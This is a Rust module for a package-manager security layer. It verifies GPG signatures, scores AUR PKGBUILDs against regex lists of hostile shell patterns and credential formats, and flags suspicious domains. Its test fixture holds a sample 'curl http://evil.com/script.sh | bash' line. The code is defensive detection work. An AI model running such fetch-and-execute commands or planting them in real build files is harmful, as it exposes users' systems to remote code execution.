use anyhow::{Context, Result, anyhow};
use chrono::{DateTime, Utc};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityConfig {
    pub keyring_dir: PathBuf,
    pub trusted_keyservers: Vec<String>,
    pub signature_verification: SignatureVerification,
    pub pkgbuild_scanning: PkgbuildScanning,
    pub trust_database: PathBuf,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SignatureVerification {
    pub required_for_aur: bool,
    pub required_for_custom: bool,
    pub allow_weak_keys: bool,
    pub min_key_size: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PkgbuildScanning {
    pub enabled: bool,
    pub scan_sources: bool,
    pub check_suspicious_domains: bool,
    pub detect_credentials: bool,
    pub risk_threshold: f64,
}

impl Default for SecurityConfig {
    fn default() -> Self {
        Self {
            keyring_dir: crate::paths::keyring_dir(),
            trusted_keyservers: vec![
                "keyserver.ubuntu.com".to_string(),
                "keys.openpgp.org".to_string(),
                "pgp.mit.edu".to_string(),
            ],
            signature_verification: SignatureVerification {
                required_for_aur: false,
                required_for_custom: true,
                allow_weak_keys: false,
                min_key_size: 2048,
            },
            pkgbuild_scanning: PkgbuildScanning {
                enabled: true,
                scan_sources: true,
                check_suspicious_domains: true,
                detect_credentials: true,
                risk_threshold: 7.0,
            },
            trust_database: crate::paths::trust_db(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TrustEntry {
    pub package_name: String,
    pub trust_score: f64,
    pub last_updated: DateTime<Utc>,
    pub security_flags: Vec<SecurityFlag>,
    pub signature_status: SignatureStatus,
    pub maintainer_trust: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum SecurityFlag {
    SuspiciousDomain(String),
    HardcodedCredentials(String),
    NetworkAccess,
    SystemModification,
    UnsignedPackage,
    WeakKey,
    ExpiredSignature,
    UnknownMaintainer,
    HighComplexity,
    RecentChanges,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum SignatureStatus {
    Valid {
        key_id: String,
        trust_level: TrustLevel,
    },
    Invalid(String),
    Missing,
    Expired,
    WeakKey,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum TrustLevel {
    Ultimate,
    Full,
    Marginal,
    None,
    Unknown,
}

pub struct SecurityManager {
    config: SecurityConfig,
    suspicious_patterns: Vec<Regex>,
    credential_patterns: Vec<Regex>,
    trust_cache: HashMap<String, TrustEntry>,
}

impl SecurityManager {
    pub fn new(config: SecurityConfig) -> Result<Self> {
        fs::create_dir_all(&config.keyring_dir)?;
        fs::create_dir_all(
            config
                .trust_database
                .parent()
                .unwrap_or(&config.keyring_dir),
        )?;

        let suspicious_patterns = Self::compile_suspicious_patterns()?;
        let credential_patterns = Self::compile_credential_patterns()?;

        Ok(Self {
            config,
            suspicious_patterns,
            credential_patterns,
            trust_cache: HashMap::new(),
        })
    }

    pub fn verify_package_signature(
        &self,
        package_path: &Path,
        signature_path: &Path,
    ) -> Result<SignatureStatus> {
        println!(
            "[security] Verifying signature for {}",
            package_path.display()
        );

        if !signature_path.exists() {
            return Ok(SignatureStatus::Missing);
        }

        let output = Command::new("gpg")
            .args(["--homedir", &self.config.keyring_dir.to_string_lossy()])
            .args(["--status-fd", "1"])
            .args([
                "--verify",
                &signature_path.to_string_lossy(),
                &package_path.to_string_lossy(),
            ])
            .output()
            .context("Failed to execute gpg verification")?;

        self.parse_gpg_output(&output.stdout, &output.stderr)
    }

    pub fn import_key(&self, key_id: &str) -> Result<()> {
        println!("[security] Importing GPG key: {}", key_id);

        for keyserver in &self.config.trusted_keyservers {
            println!("[security] Trying keyserver: {}", keyserver);

            let output = Command::new("gpg")
                .args(["--homedir", &self.config.keyring_dir.to_string_lossy()])
                .args(["--keyserver", keyserver])
                .args(["--recv-keys", key_id])
                .output()
                .context("Failed to import key")?;

            if output.status.success() {
                println!("[security] ✅ Successfully imported key from {}", keyserver);
                return Ok(());
            } else {
                println!(
                    "[security] ⚠️  Failed to import from {}: {}",
                    keyserver,
                    String::from_utf8_lossy(&output.stderr)
                );
            }
        }

        Err(anyhow!(
            "Failed to import key {} from any keyserver",
            key_id
        ))
    }

    pub fn scan_pkgbuild(&self, pkgbuild_path: &Path) -> Result<SecurityAnalysis> {
        println!(
            "[security] 🔍 Scanning PKGBUILD: {}",
            pkgbuild_path.display()
        );

        let content =
            fs::read_to_string(pkgbuild_path).with_context(|| "Failed to read PKGBUILD")?;

        let mut analysis = SecurityAnalysis {
            risk_score: 0.0,
            flags: Vec::new(),
            suspicious_lines: Vec::new(),
            network_access: false,
            system_modification: false,
        };

        if self.config.pkgbuild_scanning.enabled {
            self.scan_for_suspicious_patterns(&content, &mut analysis)?;

            if self.config.pkgbuild_scanning.detect_credentials {
                self.scan_for_credentials(&content, &mut analysis)?;
            }

            if self.config.pkgbuild_scanning.check_suspicious_domains {
                self.scan_for_suspicious_domains(&content, &mut analysis)?;
            }

            self.analyze_complexity(&content, &mut analysis)?;
        }

        analysis.risk_score = self.calculate_risk_score(&analysis);

        println!(
            "[security] Analysis complete - Risk Score: {:.1}/10",
            analysis.risk_score
        );
        Ok(analysis)
    }

    pub fn update_trust_entry(
        &mut self,
        package_name: &str,
        analysis: SecurityAnalysis,
    ) -> Result<()> {
        let trust_entry = TrustEntry {
            package_name: package_name.to_string(),
            trust_score: 10.0 - analysis.risk_score, // Invert risk to get trust
            last_updated: Utc::now(),
            security_flags: analysis.flags,
            signature_status: SignatureStatus::Missing, // Will be updated separately
            maintainer_trust: 5.0,                      // Default neutral trust
        };

        self.trust_cache
            .insert(package_name.to_string(), trust_entry);
        self.save_trust_database()?;

        Ok(())
    }

    pub fn get_trust_score(&self, package_name: &str) -> f64 {
        self.trust_cache
            .get(package_name)
            .map(|entry| entry.trust_score)
            .unwrap_or(5.0) // Default neutral score
    }

    pub fn get_trust_badge(&self, trust_score: f64) -> &'static str {
        match trust_score {
            score if score >= 9.0 => "🛡️ TRUSTED",
            score if score >= 7.0 => "✅ VERIFIED",
            score if score >= 5.0 => "⚖️ NEUTRAL",
            score if score >= 3.0 => "⚠️ CAUTION",
            _ => "❌ UNSAFE",
        }
    }

    fn compile_suspicious_patterns() -> Result<Vec<Regex>> {
        let patterns = [
            r"curl\s+.*\|\s*(bash|sh)",    // Piping curl to shell
            r"wget\s+.*\|\s*(bash|sh)",    // Piping wget to shell
            r"chmod\s+\+x.*tmp",           // Making temp files executable
            r"/etc/passwd",                // Accessing password file
            r"/etc/shadow",                // Accessing shadow file
            r"sudo\s+.*without.*password", // Sudo without password
            r"rm\s+-rf\s+/",               // Dangerous recursive removal
            r"dd\s+if=.*of=.*",            // Direct disk operations
            r"nc\s+.*-e",                  // Netcat with command execution
            r"python.*-c.*exec",           // Python exec patterns
            r"eval\s*\(",                  // Eval functions
            r"system\s*\(",                // System calls
            r"\$\(.*\)",                   // Command substitution
            r"`.*`",                       // Backtick command execution
            r"base64\s+.*decode",          // Base64 decode (possible obfuscation)
        ];

        patterns
            .iter()
            .map(|pattern| Regex::new(pattern))
            .collect::<Result<Vec<_>, _>>()
            .context("Failed to compile suspicious patterns")
    }

    fn compile_credential_patterns() -> Result<Vec<Regex>> {
        let patterns = [
            r#"password\s*=\s*['"].*['"]"#,
            r#"api_key\s*=\s*['"].*['"]"#,
            r#"secret\s*=\s*['"].*['"]"#,
            r#"token\s*=\s*['"].*['"]"#,
            r#"auth\s*=\s*['"].*['"]"#,
            r"private_key.*BEGIN.*PRIVATE.*KEY",
            r"-----BEGIN\s+RSA\s+PRIVATE\s+KEY-----",
            r"ssh-rsa\s+[A-Za-z0-9+/]+=*",
            r"AKIA[0-9A-Z]{16}",        // AWS Access Key
            r"sk_live_[0-9a-zA-Z]{24}", // Stripe Secret Key
        ];

        patterns
            .iter()
            .map(|pattern| Regex::new(pattern))
            .collect::<Result<Vec<_>, _>>()
            .context("Failed to compile credential patterns")
    }

    fn scan_for_suspicious_patterns(
        &self,
        content: &str,
        analysis: &mut SecurityAnalysis,
    ) -> Result<()> {
        for (line_num, line) in content.lines().enumerate() {
            for pattern in &self.suspicious_patterns {
                if pattern.is_match(line) {
                    analysis
                        .suspicious_lines
                        .push(format!("Line {}: {}", line_num + 1, line));
                    analysis.risk_score += 1.0;

                    // Add specific flags based on pattern
                    if line.contains("curl") || line.contains("wget") {
                        analysis.network_access = true;
                        analysis.flags.push(SecurityFlag::NetworkAccess);
                    }

                    if line.contains("/etc/") || line.contains("sudo") {
                        analysis.system_modification = true;
                        analysis.flags.push(SecurityFlag::SystemModification);
                    }

                    if line.contains("eval") || line.contains("exec") {
                        analysis.flags.push(SecurityFlag::HighComplexity);
                    }
                }
            }
        }

        Ok(())
    }

    fn scan_for_credentials(&self, content: &str, analysis: &mut SecurityAnalysis) -> Result<()> {
        for pattern in &self.credential_patterns {
            if let Some(mat) = pattern.find(content) {
                let credential_type = if mat.as_str().contains("password") {
                    "password"
                } else if mat.as_str().contains("key") {
                    "private key"
                } else if mat.as_str().contains("token") {
                    "token"
                } else {
                    "credential"
                };

                analysis.flags.push(SecurityFlag::HardcodedCredentials(
                    credential_type.to_string(),
                ));
                analysis.risk_score += 2.0; // Credentials are serious
            }
        }

        Ok(())
    }

    fn scan_for_suspicious_domains(
        &self,
        content: &str,
        analysis: &mut SecurityAnalysis,
    ) -> Result<()> {
        let suspicious_domains = [
            "bit.ly",
            "tinyurl.com",
            "goo.gl",
            "t.co", // URL shorteners
            "pastebin.com",
            "paste.ee",
            "ghostbin.com", // Paste sites
            "temp.sh",
            "0x0.st",
            "file.io", // Temporary file hosts
            "discord.gg",
            "t.me", // Chat platforms (suspicious for downloads)
        ];

        for domain in &suspicious_domains {
            if content.contains(domain) {
                analysis
                    .flags
                    .push(SecurityFlag::SuspiciousDomain(domain.to_string()));
                analysis.risk_score += 0.5;
            }
        }

        Ok(())
    }

    fn analyze_complexity(&self, content: &str, analysis: &mut SecurityAnalysis) -> Result<()> {
        let lines = content.lines().count();
        let functions = content.matches("function ").count() + content.matches("() {").count();
        let conditions = content.matches(" if ").count() + content.matches(" while ").count();

        // High complexity might indicate obfuscation
        if lines > 200 || functions > 10 || conditions > 20 {
            analysis.flags.push(SecurityFlag::HighComplexity);
            analysis.risk_score += 0.5;
        }

        Ok(())
    }

    fn calculate_risk_score(&self, analysis: &SecurityAnalysis) -> f64 {
        let mut score = analysis.risk_score;

        // Additional scoring based on flags
        for flag in &analysis.flags {
            match flag {
                SecurityFlag::HardcodedCredentials(_) => score += 3.0,
                SecurityFlag::SuspiciousDomain(_) => score += 1.0,
                SecurityFlag::NetworkAccess => score += 0.5,
                SecurityFlag::SystemModification => score += 1.5,
                SecurityFlag::UnsignedPackage => score += 2.0,
                SecurityFlag::WeakKey => score += 2.5,
                SecurityFlag::ExpiredSignature => score += 1.0,
                SecurityFlag::UnknownMaintainer => score += 1.0,
                SecurityFlag::HighComplexity => score += 0.5,
                SecurityFlag::RecentChanges => score += 0.2,
            }
        }

        // Cap the score at 10.0
        score.min(10.0)
    }

    fn parse_gpg_output(&self, stdout: &[u8], stderr: &[u8]) -> Result<SignatureStatus> {
        let output = String::from_utf8_lossy(stdout);
        let errors = String::from_utf8_lossy(stderr);

        // Parse GPG status output
        for line in output.lines() {
            if line.starts_with("[GNUPG:] GOODSIG") {
                if let Some(key_id) = line.split_whitespace().nth(2) {
                    return Ok(SignatureStatus::Valid {
                        key_id: key_id.to_string(),
                        trust_level: TrustLevel::Full, // Simplified for now
                    });
                }
            } else if line.starts_with("[GNUPG:] BADSIG") {
                return Ok(SignatureStatus::Invalid("Bad signature".to_string()));
            } else if line.starts_with("[GNUPG:] ERRSIG") {
                return Ok(SignatureStatus::Invalid("Signature error".to_string()));
            } else if line.starts_with("[GNUPG:] EXPKEYSIG") {
                return Ok(SignatureStatus::Expired);
            }
        }

        if errors.contains("No public key") {
            return Ok(SignatureStatus::Missing);
        }

        Ok(SignatureStatus::Invalid("Unknown error".to_string()))
    }

    fn save_trust_database(&self) -> Result<()> {
        let json = serde_json::to_string_pretty(&self.trust_cache)?;
        fs::write(&self.config.trust_database, json).context("Failed to save trust database")?;
        Ok(())
    }

    pub fn load_trust_database(&mut self) -> Result<()> {
        if self.config.trust_database.exists() {
            let content = fs::read_to_string(&self.config.trust_database)?;
            self.trust_cache =
                serde_json::from_str(&content).context("Failed to parse trust database")?;
        }
        Ok(())
    }
}

#[derive(Debug)]
pub struct SecurityAnalysis {
    pub risk_score: f64,
    pub flags: Vec<SecurityFlag>,
    pub suspicious_lines: Vec<String>,
    pub network_access: bool,
    pub system_modification: bool,
}

impl SecurityAnalysis {
    pub fn print_report(&self, package_name: &str) {
        println!("\n🛡️  Security Analysis for '{}'", package_name);
        println!("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

        println!("Risk Score: {:.1}/10", self.risk_score);

        let badge = if self.risk_score <= 3.0 {
            "🟢 LOW RISK"
        } else if self.risk_score <= 6.0 {
            "🟡 MEDIUM RISK"
        } else if self.risk_score <= 8.0 {
            "🟠 HIGH RISK"
        } else {
            "🔴 CRITICAL RISK"
        };
        println!("Risk Level: {}", badge);

        if !self.flags.is_empty() {
            println!("\n⚠️  Security Flags:");
            for flag in &self.flags {
                match flag {
                    SecurityFlag::SuspiciousDomain(domain) => {
                        println!("  • Suspicious domain: {}", domain);
                    }
                    SecurityFlag::HardcodedCredentials(cred_type) => {
                        println!("  • Hardcoded credentials detected: {}", cred_type);
                    }
                    SecurityFlag::NetworkAccess => {
                        println!("  • Network access detected");
                    }
                    SecurityFlag::SystemModification => {
                        println!("  • System modification detected");
                    }
                    SecurityFlag::HighComplexity => {
                        println!("  • High complexity (possible obfuscation)");
                    }
                    _ => {
                        println!("  • {:?}", flag);
                    }
                }
            }
        }

        if !self.suspicious_lines.is_empty() {
            println!("\n🔍 Suspicious Lines:");
            for line in self.suspicious_lines.iter().take(5) {
                println!("  • {}", line);
            }
            if self.suspicious_lines.len() > 5 {
                println!("  ... and {} more", self.suspicious_lines.len() - 5);
            }
        }

        println!();
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    #[test]
    fn test_security_manager_creation() {
        let temp_dir = TempDir::new().unwrap();
        let config = SecurityConfig {
            keyring_dir: temp_dir.path().join("keyring"),
            trust_database: temp_dir.path().join("trust.db"),
            ..Default::default()
        };

        let security_manager = SecurityManager::new(config);
        assert!(security_manager.is_ok());
    }

    #[test]
    fn test_pkgbuild_scanning() {
        let temp_dir = TempDir::new().unwrap();
        let config = SecurityConfig {
            keyring_dir: temp_dir.path().join("keyring"),
            ..Default::default()
        };

        let security_manager = SecurityManager::new(config).unwrap();

        let suspicious_pkgbuild = r#"
            pkgname=suspicious-package
            build() {
                curl http://evil.com/script.sh | bash
                password="hardcoded_secret"
            }
        "#;

        let pkgbuild_path = temp_dir.path().join("PKGBUILD");
        fs::write(&pkgbuild_path, suspicious_pkgbuild).unwrap();

        let analysis = security_manager.scan_pkgbuild(&pkgbuild_path).unwrap();
        assert!(analysis.risk_score > 5.0);
        assert!(analysis.network_access);
        assert!(!analysis.flags.is_empty());
    }

    #[test]
    fn test_trust_badge_calculation() {
        let temp_dir = TempDir::new().unwrap();
        let config = SecurityConfig {
            keyring_dir: temp_dir.path().join("keyring"),
            ..Default::default()
        };

        let security_manager = SecurityManager::new(config).unwrap();

        assert_eq!(security_manager.get_trust_badge(9.5), "🛡️ TRUSTED");
        assert_eq!(security_manager.get_trust_badge(7.5), "✅ VERIFIED");
        assert_eq!(security_manager.get_trust_badge(5.0), "⚖️ NEUTRAL");
        assert_eq!(security_manager.get_trust_badge(3.5), "⚠️ CAUTION");
        assert_eq!(security_manager.get_trust_badge(1.0), "❌ UNSAFE");
    }
}
